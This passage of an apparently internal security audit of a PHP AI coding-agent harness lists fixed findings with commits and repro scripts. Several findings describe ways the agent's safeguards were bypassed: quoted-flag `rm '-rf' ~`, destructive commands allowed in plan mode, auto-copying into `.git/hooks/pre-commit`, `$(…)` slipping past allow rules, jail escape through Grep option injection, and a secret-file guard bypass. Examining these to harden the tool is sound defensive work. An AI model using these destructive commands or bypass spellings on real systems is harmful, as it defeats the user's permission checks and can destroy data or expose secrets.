- `HookConfig`: strict schema, finite timeouts. Project `hooks.yaml` is trust-gated in `Bootstrap` (config trust itself is 15d's scope). Matchers are case-insensitive and unanchored, which errs toward running deny hooks.
- `HookDispatcher`: not constructed anywhere in `src/`. Its `[exit-1]` "non-blocking deny" arm is unreachable because `ScriptHook` no longer emits the prefix.
- `ScriptHook` exit-code table: matches HOOKS.md (`r04_hook_exit.php`).
- `LspTool`: jail applied, `is_file` check, JSON output capped. Only nit: a non-UTF-8 server answer makes `json_encode` return `false` and an empty body, with no finding filed.
- The filtered phpunit run (`PermissionGate|ProtectFilesHook|GrepTest|SafetyClassifier|PermissionRule|ConfirmRemove|WebFetch`): **510 tests OK**. No test pins any repro'd behaviour as intended, except that `PermissionModeDescriptionTest` pins the Plan description quoted in F-P2.

**Out of scope, pointed elsewhere:** nested `CLAUDE.md`/`AGENTS.md` bodies that Grep/Glob/Edit/Write append to tool results through `InstructionFileLoader` (size and encoding: 15a C3 and 15d-08); MCP stdio env (known #34); `LspClient` internals.

**Repro scripts** (`/home/sites/crush-research-repos/_audit-scratch/15c/`): `r01_binary` (F-T1), `r02_orphan` (F-E2), `r03_grep_optinj` (F-J1), `r04_hook_exit` (exit-code table), `r05_ssrf` (F-W1), `r06_edit_big` (F-T2; the 35 MB `big.txt` fixture has been deleted, and the script recreates it), `r07_env_grep` (F-J2), `r08_gate` (F-P1/F-P2), `r09_accept` (F-P4/F-J4), `r10_auto` (F-P3), `r11_rules` (F-P5/F-J3), `r12_post_block` (F-H1), `r13_hook_env` (F-E1), `r14_escape` (F-J5), `r15_redirect` + `web/router.php` (F-W2; start `php -S 127.0.0.1:8765 web/router.php` first), `r16_gitignore_redos` (F-T5; it builds its own `redos/` fixture, with an optional file count argument), `r17_forged_refusal` (F-P8), `r18_hook_slash` (F-H3). Fixtures: `root/` (latin1.txt, .env, .gitignore, innocent_link→../outside, orphan_marker), `outside/creds.txt`, `fifo/`.

---

## Fixed since audit

These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.

- **F-T1** A non-UTF-8 byte in any tool result killed the turn — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15a A6). Residual: the command backends still encode without `JSON_INVALID_UTF8_SUBSTITUTE` (15a A22), fixed later in `987c8d87f`.
- **F-J1** Grep option injection (`-Re…`) followed symlinks out of the jail — fixed on master in `3673614b1`.
- **F-J2** `.env` / `.git/config` secret guard bypassed by Grep and quoted Bash spellings — fixed on master in `36f139c50` (+ docs follow-up `3b04aefe8`).
- **F-J4** `.git/hooks/*` unprotected; accept-edits auto-ran `cp ./x ./.git/hooks/pre-commit` — fixed on master in `a948c3da3` (+ docs follow-up `3b04aefe8`). Known limit: `git config core.hooksPath x` (and similar config keys) redirects hooks without naming `.git/hooks`; the permission mode is the boundary there.
- **F-P1** Quoted-flag `rm '-rf' ~` bypassed the step-0 breaker and ConfirmRemoveHook — fixed on master in `a87b95aa3`.
- **F-P2** Plan mode allowed `>f`, `2> f`, `sed -i`, `rm`, `git push --force` — fixed on master in `d3d90fece` (plan Bash is now an allow-list of read-only commands, fail closed; the same commit rewrote the stale PERMISSIONS.md matching section).
- **F-W1** WebFetch SSRF blocklist missed 100.64/10, 198.18/15, NAT64 and 6to4 — fixed on master in `0594e0e17`.
- **F-P5** Argument-scoped allow rules accepted `$(…)`, backticks and redirects — fixed on master in `c8fc573a5` (the Allow arm is fail-closed via `ShellWords`: it refuses incomplete lines, `$(`, backticks, `<(`/`>(`, `${…}`/`$[…]` and non-inert redirection, and every unquoted-operator segment must match; Deny and Ask also match quote-removed and per-command readings, so `true; 'rm' -rf x` hits `Deny Bash(rm *)`; PERMISSIONS.md now describes the fail-closed allow rules). Still open and separate: F-J3 (path respellings). Allow matching is still per rule (`Allow git *` + `Allow grep *` does not grant `git log | grep x`); that is documented, not a bug.
- **F-T5** A hostile `.gitignore` made Glob spend about 70 ms per file, and backtrack errors failed open — fixed on master in `bae0297ce` (`IgnoreRules` builds patterns as tokens; PCRE is kept for safe shapes, and every other pattern, and any PCRE error, goes to a cached DFA that never backtracks; an undecidable rule fails closed, so a hide applies and a negation does not re-include; verdicts are cached per directory). The repro Glob over 2,000 files went from 139 s to 0.34 s. Residual: `IgnoreRules::undecidablePatterns()` is not surfaced to the model by Glob or Grep; nothing reads it yet.
- **F-T6** The `doctor` tool probed the terminal from inside the turn fork — fixed on master in `977179c1e` (Doctor reads the boot-time `ToolResult::mosaic()` probe and never touches the tty). Residual: `Bootstrap::backend()` does not warm `ToolResult::mosaic()`, so headless runs still probe lazily from the tool (harmless with no TUI); the `DetectsCapabilities` docblock still cites Doctor's old `self::$mosaic ??=` idiom (15b-32).
- **F-E3** Bash's `cd ROOT && CMD` ran later `;`-separated commands in the wrong directory when `cd` failed — fixed on master in `750ffdd13` (the prefix is `cd ROOT || exit 1` plus a newline, so a missing root runs nothing; `proc_open`'s `cwd` was rejected because on PHP 8.3.6 a missing cwd only warns and returns false). Still open nearby: `ProcessContainment::interactiveSpawnCommand()` keeps the old prefix (F-E5).
- **F-H1** A PostToolUse block or deny was a silent no-op — fixed on master in `19f25de74` (in `Runtime::settle()`, any PostToolUse verdict that does not permit the call — deny or exit 2, timeout, ask, unknown action — replaces what the model and the UI see with `[output withheld by PostToolUse hook: <reason>] The call ran; its output is not shown.`; image and diff are stripped, `isError` is kept as the tool set it, the refusing hook's own `additionalContext` is dropped; HOOKS.md's `continueOnBlock` claim and the "discarded by both consumers" sentence are corrected). Residual: the text names no hook, because `HookResult` does not carry which hook refused; a hook that throws is still only an annotation; the dormant `Chat::applyPostToolUse()` mirror is unchanged (scheduled for w7-gate-prov).
- **F-H2** The audit log recorded only completed calls, could be forged and logged unbounded input — fixed on master in `fd3b9e861` (new `AuditHook::recordDenial()` and `recordWithheld()`; Runtime logs from `gate()`'s refusal arm — hook deny, gate deny, refused or unanswered ask, PreToolUse timeout — and from the F-H3 encode refusal and the F-H1 withheld arm, as `=! DENY <hook|refused|unanswered>: <reason>` and `=! WITHHELD: <reason>`; every field is control-character escaped, the 200-byte excerpt is cut on a UTF-8 boundary, and input is capped at 4 KiB with a `[truncated: N bytes]` marker; HOOKS.md gains "What the audit log records"). Residual: built-ins run first, so a withheld call usually also gets the ordinary `=>` line, whose excerpt may still hold the secret (the log is in a 0700 per-user directory).
- **F-H3** Hook input JSON escaped `/`, and an encode failure gave hooks `{}` — fixed on master in `fa74a16be` (encoded with `JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE | JSON_THROW_ON_ERROR`; arguments that cannot be encoded are refused as `Hook denied:` before any hook runs, on both the sequential and concurrent paths; HOOKS.md states the encoding). Residual: the dormant `Chat.php` mirrors (bare `json_encode` at about `:4386` and `:4569`) are unchanged (w7-gate-prov).
- **F-H4** SkillTool's `args` was advertised and silently dropped — fixed on master in `299e945d0` (`$ARGUMENTS` in the skill body is substituted from `args`, or `ARGUMENTS: <args>` is appended when the body has no placeholder; a non-string name or `args` returns a tool error instead of a `TypeError`; `docs/SKILLS.md` "Invoking a skill" updated).
- **F-T4** Read, Edit and Write blocked forever on a FIFO (or device) inside the root — fixed on master in `c339b3682` (all three return `Error: not a regular file` for a FIFO, socket or device instead of blocking in open(2); a symlink to a regular file still works and a dangling link behaves as before; Edit also refuses a directory).
- **F-T2** Edit ignored its own `$maxBytes`, so a large file cost about 18× its size in RAM — fixed on master in `139864c7d` (Edit checks `$maxBytes` with `filesize()` before it reads and caps the read at maxBytes+1 bytes, so a file that grows after the check is refused too; `BuildsUnifiedDiff` trims the common prefix and suffix on the raw strings and splits only the changed middle plus 3 context lines, byte-identical to the old diff; a changed region over 20k lines or 4 MiB gets a "+N -M lines; diff preview omitted" summary; Write gains a trailing optional `maxDiffBytes`, default 1 MiB, and does not read a previous file bigger than that, overwriting it without a diff). Measured on a 36 MB file: before, the edit succeeded at 651 MB peak; after, it is refused at 10 MB peak, and with the cap raised it succeeds at 79 MB. Behaviour change: Edit now refuses files over 1 MiB, the existing `DEFAULT_MAX_BYTES` that was never enforced (Bootstrap passes no override).
- **F-T7** Edit and Write rewrote files in place, so a kill mid-write left a truncated file — fixed on master in `103a497a5` (new `AtomicFileWriter::replace()` writes a temp file beside the target and renames it over the target, copying the mode before writing, trying to copy uid/gid, and calling fsync; a symlink is resolved and its target replaced, so the link survives; a hard link (nlink > 1), or a directory where no temp can be created or renamed, falls back to an in-place write that writes first and truncates after, so the file is never empty; a non-writable file is still refused; Edit and Write take a trailing optional `?\Closure $writeSeam`, null in production). Residual: ACLs and xattrs are not copied, and a real SIGKILL can leave an orphan `.<name>.tmp.<hex>` file. Follow-up: the `tests/RuntimeTest.php` docblock near line 6757 still quotes the write scanner's old known answers (`Edit.php` reports `file_put_contents`); the controls themselves moved to `Support/AtomicFileWriter.php`.
- **F-T3** WebFetch returned up to 2 MiB raw into context, 32× Bash's cap — fixed on master in `a8209382c` (the result goes through `TruncatesOutput` with a 64 KiB default, set by a new trailing constructor parameter `$maxOutputBytes`, and ends with the shared "[truncated: N of M bytes omitted]" marker; the wire read is still bounded at 2 MiB). Residual: the default is spelled `WebFetch::MAX_OUTPUT_BYTES` (pinned equal to `DEFAULT_MAX_OUTPUT_BYTES` by a test) rather than the trait constant, pending a `TruncatesOutput` docblock edit that names WebFetch in `TruncatesOutputNudgeMarginDocTest`'s census.
- **F-W2** WebFetch returned 3xx/4xx/5xx bodies as successful results, and a relative `Location:` silently ended the redirect chain — fixed on master in `a8209382c` (`Location` is resolved per RFC 3986 §5.2 and every hop re-runs the full guard chain; a non-2xx result gets an `HTTP <code>` first line; `isError` is set for codes of 400 and above, for a 3xx with no usable `Location`, after more than 3 hops, and when there is no status line).
